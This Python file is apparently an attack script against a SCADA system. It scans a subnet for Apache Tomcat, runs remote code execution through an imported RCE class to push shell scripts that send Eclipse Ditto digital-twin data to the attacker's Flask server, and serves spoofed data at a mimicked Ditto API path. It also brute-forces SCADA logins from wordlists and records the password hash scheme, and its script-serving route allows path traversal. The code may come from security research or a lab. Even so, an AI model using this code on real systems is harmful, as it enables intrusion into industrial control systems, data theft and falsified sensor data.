from flask import Flask, request, jsonify
import nmap
import time
import threading
from RCE import RCE
from utils import *

this_ip = get_ip_address('eth0')
this_port = 80
substitute_in_file('scripts/fetch_ip_ditto.sh', (this_ip, this_port))

ip_ditto = None
last_data_ditto = {}

scanner = nmap.PortScanner()
scada_url = ''
time.sleep(15)
scanner.scan('172.16.10.0-255')
for host in scanner.all_hosts():
    if 'tcp' not in scanner[host]: continue
    for port in scanner[host]['tcp'].keys():
        if scanner[host]['tcp'][port]['product'] == 'Apache Tomcat':
            scada_url = f'http://{host}:{port}'
            break
print(f"Found Scada URL: ", scada_url)

rce = RCE(scada_url, 'test', 'test', this_ip, this_port)
app = Flask(__name__)

@app.route('/get_script/<string:name>')
def get_script(name):
    if not name: return "error"

    with open('scripts/'+name, 'r') as f:
        return f.read()

@app.route('/ip_ditto', methods=["POST"])
def route_ip_ditto():
    ip_ditto = str(request.get_data().decode())
    print("IP DITTO FRONTEND: "+ip_ditto, flush=True)
    
    substitute_in_file('scripts/fetch_data_ditto.sh', (ip_ditto, this_ip, this_port))
    substitute_in_file('scripts/substitute_host.sh', (this_ip,))

    return "Stored"

@app.route('/data_ditto', methods=["POST"])
def route_data_ditto():
    json = request.get_json()
    for thing in json['items']:
        last_data_ditto[thing['thingId']] = thing['features']

    print(last_data_ditto, flush=True)
    return "Stored"

@app.route('/api/2/things/<string:thing_id>/features')
def route_simulation(thing_id):
    return last_data_ditto[thing_id]

if __name__ == "__main__":
    ### WEBSERVER
    if False:
        webserverThread = threading.Thread(target=app.run, args=('0.0.0.0', this_port))
        webserverThread.start()

    ### RCE
    if False:
        rce.execute_script('fetch_ip_ditto.sh')
        rce.execute_script('fetch_data_ditto.sh')
        rce.execute_script('substitute_host.sh')
        time.sleep(120)
        rce.execute_script('revert_host.sh')  

    print(bruteforce_password_scada(scada_url, 'wordlist/usernames.txt', 'wordlist/passwords.txt'))    
    
    # Possible Hash per password Scada DB
    # Base64(unhex(SHA-1($plaintext)))
